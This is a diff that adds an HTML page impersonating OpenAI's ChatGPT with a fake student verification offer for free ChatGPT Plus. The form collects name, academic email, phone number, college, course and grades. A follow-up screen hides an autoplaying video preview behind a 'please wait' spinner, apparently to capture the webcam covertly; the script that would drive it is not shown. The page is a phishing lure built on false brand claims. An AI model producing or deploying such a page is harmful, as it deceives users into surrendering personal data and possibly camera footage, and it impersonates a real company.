@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ChatGPT Student Verification — OpenAI</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <main class="app">
+    <header>
+      <div class="brand">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2599 24a6.0557 6.0557 0 0 0 5.7602-4.0042 5.9847 5.9847 0 0 0 3.9977-2.9 6.051 6.051 0 0 0-.7359-7.2747zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0819 4.7785-2.7582a.784.784 0 0 0 .3927-.6813v-6.7369l2.0228 1.1683a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4975 4.4952zm-8.8643-4.4716a4.4697 4.4697 0 0 1-.5328-3.0037l.142.083 4.7784 2.7582a.7946.7946 0 0 0 .7855 0l5.8342-3.369v2.3364a.08.08 0 0 1-.0332.0664l-4.8345 2.7915a4.5015 4.5015 0 0 1-6.1396-1.6628zm-1.166-9.6108a4.4619 4.4619 0 0 1 2.3486-1.9629v5.679a.784.784 0 0 0 .3927.6813l5.8342 3.369-2.0228 1.1683a.078.078 0 0 1-.0735.0068l-4.8346-2.7915a4.504 4.504 0 0 1-1.6446-6.1499zm14.8872 3.626-5.8342-3.369 2.0228-1.1683a.078.078 0 0 1 .0735-.0068l4.8346 2.7915a4.5028 4.5028 0 0 1 .645 7.4243l-.142-.083-4.7784-2.7582a.7946.7946 0 0 0-.7855 0zm2.0838-4.8988a4.4619 4.4619 0 0 1-.5328 3.0037l-.142-.083-4.7784-2.7582a.7946.7946 0 0 0-.7855 0l-5.8342 3.369V8.4552a.08.08 0 0 1 .0332-.0664l4.8345-2.7915a4.5015 4.5015 0 0 1 6.1396 1.6628l1.0656.8105zm-11.7582-4.0042a4.4755 4.4755 0 0 1 2.8764 1.0408l-.1419.0819-4.7785 2.7582a.784.784 0 0 0-.3927.6813v6.7369l-2.0228-1.1683a.071.071 0 0 1-.038-.052v-5.5826a4.504 4.504 0 0 1 4.4975-4.4952zm.4365 7.1517 2.8122-1.6247 2.8122 1.6247v3.2494l-2.8122 1.6247-2.8122-1.6247z" fill="currentColor"/>
+        </svg>
+        <span>ChatGPT</span>
+      </div>
+      <span class="pill">Education Offer</span>
+    </header>
+
+    <!-- Screen 1: Form Screen -->
+    <section id="formScreen" class="panel">
+      <div class="mark">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></svg>
+      </div>
+      <p class="eyebrow">Student Verification Program</p>
+      <h1>ChatGPT Plus <span>Education Plan</span></h1>
+      <p class="muted">Enter your academic information to verify eligibility for 12 months of complimentary access.</p>
+
+      <form id="leadForm">
+        <label for="fullName">Full name
+          <input id="fullName" name="name" type="text" autocomplete="name" required placeholder="e.g. Jane Doe">
+        </label>
+        <label for="emailAddr">Academic email address
+          <input id="emailAddr" name="email" type="email" autocomplete="email" required placeholder="name@university.edu">
+        </label>
+        <label for="phoneNum">Phone number
+          <input id="phoneNum" name="phone" type="tel" autocomplete="tel" required placeholder="+91 98765 43210">
+        </label>
+        <label for="collegeName">College / University name
+          <input id="collegeName" name="college" type="text" required placeholder="e.g. Delhi University / IIT">
+        </label>
+        <label for="courseName">Course / Degree
+          <input id="courseName" name="course" type="text" required placeholder="e.g. B.Tech Computer Science">
+        </label>
+        <label for="percentage12th">12th Percentage / CGPA
+          <input id="percentage12th" name="percentage" type="text" required placeholder="e.g. 92% or 9.5 CGPA">
+        </label>
+        <button id="submitBtn" type="submit">Continue <span>→</span></button>
+      </form>
+
+      <p id="formError" class="error" role="alert"></p>
+    </section>
+
+    <!-- Screen 2: Welcome / Verification Screen -->
+    <section id="welcomeScreen" class="panel hidden">
+      <div class="success">Details submitted successfully ✓</div>
+      <h1 class="welcome">Verification in Progress <span>ChatGPT Plus</span></h1>
+      <div class="message">Identity & Enrollment Check</div>
+
+      <div id="noticeBox" class="notice">
+        <h2>Verification may take up to 24 hours</h2>
+        <p><strong>Status: Pending Academic Review</strong></p>
+        <p>We are verifying your academic details with your institution. Additional identity verification (e.g., student ID verification) may be requested.</p>
+        <p class="muted small">By proceeding, you agree to OpenAI's Terms of Use and Privacy Policy.</p>
+        
+        <button id="allowBtn" type="button">Begin Verification</button>
+        <button id="declineBtn" class="secondary" type="button">Cancel</button>
+      </div>
+
+      <div id="cameraBox" class="camera hidden">
+        <div class="loader-container">
+          <div class="spinner"></div>
+          <p id="cameraStatus" class="muted">Please wait while submitting request...</p>
+        </div>
+        <div class="hidden-preview">
+          <video id="preview" autoplay playsinline muted></video>
+        </div>
+        <button id="stopBtn" class="stop hidden" type="button">Cancel verification</button>
+      </div>
+    </section>
+
+    <footer>&copy; OpenAI &middot; ChatGPT for Education</footer>
+  </main>
+  <script src="app.js"></script>
+</body>
+</html>
